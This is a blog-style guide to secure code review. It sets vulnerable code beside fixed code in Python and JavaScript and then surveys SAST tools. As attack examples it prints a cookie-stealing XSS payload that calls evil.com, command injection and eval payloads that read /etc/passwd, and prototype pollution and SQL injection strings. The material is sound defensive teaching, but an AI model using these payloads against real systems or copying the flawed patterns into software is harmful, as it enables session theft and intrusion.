---
title: "Secure Code Review - Finding Vulnerabilities in Source Code"
description: "Guide to secure code review methodology, common vulnerability patterns across languages, and automated SAST tools for application security."
date: "2025-05-30"
category: "Application Security"
tags: ["Secure Coding", "Code Review", "SAST", "AppSec"]
image: "/images/blog/secure-code-review.webp"
imageAlt: "Secure code review with vulnerability detection highlights"
imagePrompt: "Secure code review, source code analysis, vulnerability detection, matte black background, neon green code lines, cyan security highlights, bug detection, SAST tools interface, application security, developer security illustration"
author: "Rana Uzair Ahmad"
readTime: "15 min"
difficulty: "Advanced"
---

Every vulnerability in production started as a line of code that someone wrote and someone else approved. Secure code review is the practice of systematically examining source code to identify security flaws before they reach users. It is the most cost-effective security activity you can perform — finding a vulnerability during development costs a fraction of finding it in production after a breach. This guide covers the methodology, common vulnerability patterns across languages, and the tools that make the process scalable.

## The Shift-Left Security Mindset

Traditional security testing happens late in the development cycle — a penetration test before launch, a vulnerability scan after deployment. By that point, fixing issues is expensive and disruptive. Shift-left security moves security activities earlier into the development process:

```
Traditional:  Plan → Build → Test → Deploy → [Security Test] → Fix
Shift-Left:   Plan → [Threat Model] → [Secure Code Review] → Build → [SAST/DAST] → Deploy
```

Secure code review sits at the heart of shift-left. It catches vulnerabilities when they are cheapest to fix — while the developer still has the code fresh in their mind, before it is merged, tested, and deployed.

## Code Review Methodology

### Data Flow Analysis

The most effective approach to secure code review is following the data. Every vulnerability involves untrusted input reaching a dangerous function (a "sink") without proper validation or sanitization.

```
[Source]  →  [Processing]  →  [Sink]
User Input → Business Logic → Database Query / File System / OS Command / HTML Output
```

**Steps:**

1. **Identify entry points** — HTTP handlers, API endpoints, message queue consumers, file parsers.
2. **Trace data flow** — Follow user-controlled input through the application.
3. **Identify sinks** — Database queries, file operations, OS commands, template rendering, deserialization.
4. **Check for validation** — Is the input validated, sanitized, or parameterized before reaching the sink?
5. **Assess trust boundaries** — Where does the application transition between trusted and untrusted contexts?

### Trust Boundaries

A trust boundary is any point where data moves between different levels of trust:

- **External → Application** — HTTP requests, file uploads, API calls.
- **Application → Database** — SQL queries, NoSQL operations.
- **Application → OS** — System commands, file system operations.
- **Application → Browser** — HTML rendering, JavaScript execution.
- **Service → Service** — Internal API calls (do not assume internal traffic is safe).

Every trust boundary crossing requires validation.

## Common Vulnerability Patterns

### SQL Injection

The most classic and still prevalent vulnerability. It occurs when user input is concatenated directly into SQL queries.

**Vulnerable (Python):**

```python
# VULNERABLE: String concatenation in SQL query
@app.route('/users')
def get_user():
    username = request.args.get('username')
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return jsonify(cursor.fetchall())

# Attack: ?username=' OR '1'='1' --
# Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1' --'
```

**Secure (Python):**

```python
# SECURE: Parameterized query — input is never part of the SQL structure
@app.route('/users')
def get_user():
    username = request.args.get('username')
    query = "SELECT * FROM users WHERE username = %s"
    cursor.execute(query, (username,))
    return jsonify(cursor.fetchall())
```

**Vulnerable (JavaScript/Node.js):**

```javascript
// VULNERABLE: String interpolation in SQL
app.get('/users', (req, res) => {
    const username = req.query.username;
    const query = `SELECT * FROM users WHERE username = '${username}'`;
    db.query(query, (err, results) => {
        res.json(results);
    });
});
```

**Secure (JavaScript/Node.js):**

```javascript
// SECURE: Parameterized query with placeholders
app.get('/users', (req, res) => {
    const username = req.query.username;
    db.query('SELECT * FROM users WHERE username = ?', [username], (err, results) => {
        res.json(results);
    });
});
```

### Cross-Site Scripting (XSS)

XSS occurs when user input is rendered in HTML without proper encoding. There are three types: Reflected, Stored, and DOM-based.

**Vulnerable (Python/Flask):**

```python
# VULNERABLE: User input rendered directly in HTML
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return f"<h1>Results for: {query}</h1>"

# Attack: ?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

**Secure (Python/Flask):**

```python
# SECURE: Use template engine with auto-escaping
from markupsafe import escape

@app.route('/search')
def search():
    query = request.args.get('q', '')
    return render_template('search.html', query=query)
    # Jinja2 auto-escapes by default: {{ query }}
```

**Vulnerable (JavaScript — DOM-based XSS):**

```javascript
// VULNERABLE: innerHTML with user-controlled data
const userInput = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').innerHTML = `Welcome, ${userInput}!`;

// Attack: ?name=<img src=x onerror=alert(document.cookie)>
```

**Secure (JavaScript):**

```javascript
// SECURE: Use textContent instead of innerHTML
const userInput = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').textContent = `Welcome, ${userInput}!`;
```

### Dangerous eval() and Dynamic Code Execution

```javascript
// VULNERABLE: eval() with user input — Remote Code Execution
app.post('/calculate', (req, res) => {
    const expression = req.body.expression;
    const result = eval(expression);  // NEVER DO THIS
    res.json({ result });
});

// Attack: expression = "require('child_process').execSync('cat /etc/passwd').toString()"
```

```javascript
// SECURE: Use a safe math parser
const mathjs = require('mathjs');

app.post('/calculate', (req, res) => {
    try {
        const result = mathjs.evaluate(req.body.expression);
        res.json({ result });
    } catch (e) {
        res.status(400).json({ error: 'Invalid expression' });
    }
});
```

### Prototype Pollution (JavaScript)

Prototype pollution is a JavaScript-specific vulnerability where an attacker modifies `Object.prototype`, affecting all objects in the application.

```javascript
// VULNERABLE: Recursive merge without prototype check
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

// Attack payload: {"__proto__": {"isAdmin": true}}
merge({}, JSON.parse(userInput));
// Now every object in the app has isAdmin === true
```

```javascript
// SECURE: Check for prototype pollution keys
function safeMerge(target, source) {
    for (let key in source) {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue;  // Skip dangerous keys
        }
        if (Object.prototype.hasOwnProperty.call(source, key)) {
            if (typeof source[key] === 'object' && source[key] !== null) {
                if (!target[key]) target[key] = {};
                safeMerge(target[key], source[key]);
            } else {
                target[key] = source[key];
            }
        }
    }
}
```

### Command Injection

```python
# VULNERABLE: User input in os.system call
import os

@app.route('/ping')
def ping():
    host = request.args.get('host')
    output = os.popen(f"ping -c 3 {host}").read()
    return f"<pre>{output}</pre>"

# Attack: ?host=8.8.8.8; cat /etc/passwd
```

```python
# SECURE: Use subprocess with shell=False and input validation
import subprocess
import re

@app.route('/ping')
def ping():
    host = request.args.get('host')
    if not re.match(r'^[\w.\-]+$', host):
        return "Invalid hostname", 400
    result = subprocess.run(
        ['ping', '-c', '3', host],
        capture_output=True, text=True, timeout=10
    )
    return f"<pre>{result.stdout}</pre>"
```

## Framework-Specific Security

### Django Security Review Checklist

```python
# settings.py — verify these security settings

DEBUG = False  # NEVER True in production
SECRET_KEY = os.environ.get('DJANGO_SECRET_KEY')  # Never hardcode
ALLOWED_HOSTS = ['yourdomain.com']  # Never use ['*']

# Security middleware (should all be True in production)
SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
SECURE_SSL_REDIRECT = True
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True
X_FRAME_OPTIONS = 'DENY'
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True

# Password validation
AUTH_PASSWORD_VALIDATORS = [
    {'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
     'OPTIONS': {'min_length': 12}},
    {'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator'},
]
```

### Express.js Security Review Checklist

```javascript
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const cors = require('cors');

// Security headers
app.use(helmet());

// CORS — restrict origins
app.use(cors({
    origin: ['https://yourdomain.com'],
    methods: ['GET', 'POST'],
    credentials: true
}));

// Rate limiting
app.use(rateLimit({
    windowMs: 15 * 60 * 1000,  // 15 minutes
    max: 100,                   // 100 requests per window
    standardHeaders: true
}));

// CRITICAL: Disable x-powered-by header
app.disable('x-powered-by');

// Input validation with express-validator
const { body, validationResult } = require('express-validator');

app.post('/register',
    body('email').isEmail().normalizeEmail(),
    body('password').isLength({ min: 12 }).trim().escape(),
    (req, res) => {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({ errors: errors.array() });
        }
        // Process validated input
    }
);
```

## Cryptography Review

Cryptography bugs are subtle and devastating. Look for these common mistakes:

```python
# VULNERABLE: Weak hashing algorithm for passwords
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()  # MD5 is broken
password_hash = hashlib.sha256(password.encode()).hexdigest()  # SHA256 is too fast for passwords

# SECURE: Use bcrypt or Argon2 for password hashing
import bcrypt
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
```

```python
# VULNERABLE: Hardcoded encryption key
AES_KEY = "mysecretkey12345"  # Hardcoded in source code

# VULNERABLE: ECB mode (patterns in ciphertext reveal patterns in plaintext)
from Crypto.Cipher import AES
cipher = AES.new(key, AES.MODE_ECB)  # ECB mode is insecure

# SECURE: Use AES-GCM with proper key management
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

key = get_random_bytes(32)  # Load from secure key management (AWS KMS, HashiCorp Vault)
nonce = get_random_bytes(12)
cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
ciphertext, tag = cipher.encrypt_and_digest(plaintext)
```

## Authentication Vulnerabilities

### JWT Issues

```python
# VULNERABLE: No signature verification
import jwt
payload = jwt.decode(token, options={"verify_signature": False})

# VULNERABLE: Accepting 'none' algorithm
payload = jwt.decode(token, algorithms=["HS256", "none"])

# SECURE: Strict algorithm enforcement and proper verification
payload = jwt.decode(
    token,
    key=os.environ['JWT_SECRET'],
    algorithms=["HS256"],  # Only allow expected algorithm
    options={"require": ["exp", "iat", "sub"]}
)
```

### OAuth Misconfiguration

```python
# VULNERABLE: Not validating redirect_uri
@app.route('/oauth/authorize')
def authorize():
    redirect_uri = request.args.get('redirect_uri')
    # No validation — attacker can redirect token to their server
    return redirect(f"{redirect_uri}?code={auth_code}")

# SECURE: Whitelist redirect URIs
ALLOWED_REDIRECT_URIS = [
    'https://app.yourdomain.com/callback',
    'https://staging.yourdomain.com/callback'
]

@app.route('/oauth/authorize')
def authorize():
    redirect_uri = request.args.get('redirect_uri')
    if redirect_uri not in ALLOWED_REDIRECT_URIS:
        return "Invalid redirect URI", 400
    return redirect(f"{redirect_uri}?code={auth_code}")
```

## Automated SAST Tools

Manual review does not scale. Augment it with Static Application Security Testing (SAST) tools:

### Semgrep

Semgrep is my favorite SAST tool — it is fast, has excellent rules, and supports custom patterns.

```bash
# Install and run Semgrep
pip install semgrep
semgrep --config auto .  # Run with default rulesets

# Run with specific security rulesets
semgrep --config p/owasp-top-ten .
semgrep --config p/javascript .
semgrep --config p/python .

# Custom Semgrep rule — detect eval() usage
# .semgrep/custom-rules.yml
```

```yaml
rules:
  - id: no-eval-with-user-input
    patterns:
      - pattern: eval($USER_INPUT)
      - pattern-not: eval("literal_string")
    message: "eval() with dynamic input detected — possible code injection"
    languages: [javascript, python]
    severity: ERROR
    metadata:
      cwe: CWE-94
      owasp: A03:2021
```

### SonarQube

```bash
# Run SonarQube scanner
docker run -d --name sonarqube -p 9000:9000 sonarqube:community

# Scan a project
sonar-scanner \
  -Dsonar.projectKey=my-app \
  -Dsonar.sources=./src \
  -Dsonar.host.url=http://localhost:9000 \
  -Dsonar.token=YOUR_TOKEN
```

### TruffleHog — Secret Detection

```bash
# Scan Git history for leaked secrets
trufflehog git file://. --since-commit HEAD~50 --json

# Scan filesystem
trufflehog filesystem --directory ./src --json

# Common findings: API keys, database passwords, JWT secrets,
# AWS access keys, private SSH keys
```

### Tool Comparison

| Tool | Type | Best For | Languages |
|------|------|----------|-----------|
| Semgrep | SAST | Custom rules, fast scanning | 30+ languages |
| SonarQube | SAST | Enterprise, quality gates | 25+ languages |
| Snyk Code | SAST | Developer-friendly, IDE integration | 10+ languages |
| TruffleHog | Secrets | Git history secret scanning | All |
| Bandit | SAST | Python-specific security | Python |
| ESLint (security plugin) | SAST | JavaScript/TypeScript | JS/TS |

## Remediation Strategies

When you find a vulnerability, remediation should follow a priority framework:

1. **Critical/High — Immediate fix.** SQL injection, RCE, authentication bypass. Stop the release.
2. **Medium — Fix before next release.** XSS, CSRF, information disclosure.
3. **Low — Track and schedule.** Missing headers, verbose errors, minor misconfigurations.

**For each finding, document:**

- What the vulnerability is (CWE reference).
- Where it is (file, line, function).
- How to exploit it (proof of concept).
- How to fix it (specific code change).
- How to prevent recurrence (rule, training, tool).

## Final Thoughts

Secure code review is not about finding fault — it is about finding vulnerabilities before attackers do. Build it into your development workflow as a standard practice, not a gate. Combine manual review for complex logic with automated SAST tools for scale. Train developers to recognize vulnerability patterns so they stop writing them in the first place. The best vulnerability is the one that was never written.
